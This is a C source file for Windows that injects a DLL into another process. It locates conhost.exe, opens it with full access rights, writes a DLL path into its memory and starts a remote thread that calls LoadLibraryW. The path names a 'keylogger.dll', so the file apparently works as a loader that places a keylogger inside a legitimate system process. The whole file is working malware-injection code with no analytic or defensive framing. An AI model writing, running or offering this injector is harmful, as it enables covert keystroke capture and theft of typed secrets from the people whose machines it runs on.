#define WIN32_LEAN_AND_MEAN // Remove winioctl.h if/elif errors
#pragma warning(disable:4820) // Padding added after data member, this warning cant be removed
#pragma warning(disable:4191) // 'function': unsafe conversion from 'FARPROC' to 'LPTHREAD_START_ROUTINE' false positive

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindTargetPID(const wchar_t* targetName)
{
	// Create a snapshot of all processes in the system
	PROCESSENTRY32W pe;
	pe.dwSize = sizeof(PROCESSENTRY32W);

	// Take a snapshot of the processes
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot == INVALID_HANDLE_VALUE)
		return 0;

	// Iterate through the processes in the snapshot
	if (Process32FirstW(snapshot, &pe))
	{
		do
		{
			// Compare the process name with the target name
			if (wcscmp(pe.szExeFile, targetName) == 0)
			{
				// Found the target process, return its PID
				CloseHandle(snapshot);
				return pe.th32ProcessID;
			}
		} while (Process32NextW(snapshot, &pe));
	}

	CloseHandle(snapshot);
	return 0;
}

int wmain(void)
{
	const wchar_t* dllPath = L"C:\\Users\\Celeste\\Documents\\tinkyWinkey\\keylogger.dll";
	const wchar_t* targetProcess = L"conhost.exe";

	// Find the target process ID
	DWORD pid = FindTargetPID(targetProcess);
	if (pid == 0)
		return 1;

	// Open the target process with all access rights
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (!hProcess)
		return 1;

	// Allocate memory in the target process for the DLL path
	size_t dllPathSize = (wcslen(dllPath) + 1) * sizeof(wchar_t);

	LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, dllPathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!remoteMem)
	{
		CloseHandle(hProcess);
		return 1;
	}

	// Write the DLL path to the allocated memory
	if (!WriteProcessMemory(hProcess, remoteMem, (LPVOID)dllPath, dllPathSize, NULL))
	{
		VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return 1;
	}

	// Create a remote thread in the target process to load the DLL
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
		(LPTHREAD_START_ROUTINE)LoadLibraryW, remoteMem, 0, NULL);

	if (!hThread)
	{
		VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return 1;
	}

	// Wait for the remote thread to finish and clean up
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	CloseHandle(hProcess);

	return 0;
}
